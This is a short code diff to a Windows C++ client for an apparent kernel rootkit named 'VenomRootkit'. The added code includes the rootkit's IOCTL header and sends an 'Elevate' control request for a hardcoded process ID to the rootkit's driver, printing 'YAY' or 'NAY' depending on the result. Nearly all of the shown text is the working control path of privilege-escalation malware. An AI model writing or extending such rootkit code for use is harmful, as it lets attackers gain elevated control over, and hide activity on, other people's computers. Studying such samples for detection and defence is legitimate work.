@@ -1,6 +1,7 @@
 #include <Windows.h>
 #include <iostream>
 #include <string>
+#include "../VenomRootkit/Ioctl.h"
 
 using namespace std;
 
@@ -17,5 +18,21 @@ int main(int argc, const char* argv[]) {
 		return 1;
 	}
 
-	//BOOL success = DeviceIoControl(hFile, IOCTL_PROCESS_GUARD_FORBIDDEN_PROCESS, &data, sizeof(data), nullptr, 0, &returned, nullptr);
+	ULONG PID = 6540;
+	DWORD returned = 0;
+	BOOL success = DeviceIoControl(hDevice, (DWORD)VenomIoctls::Elevate, &PID, sizeof(PID), nullptr, 0, &returned, nullptr);
+
+	if (success)
+	{
+		cout << "YAY" << endl;
+	}
+	else
+	{
+		cout << "NAY" << endl;
+	}
+
+	CloseHandle(hDevice);
+
+	return 0;
+
 }
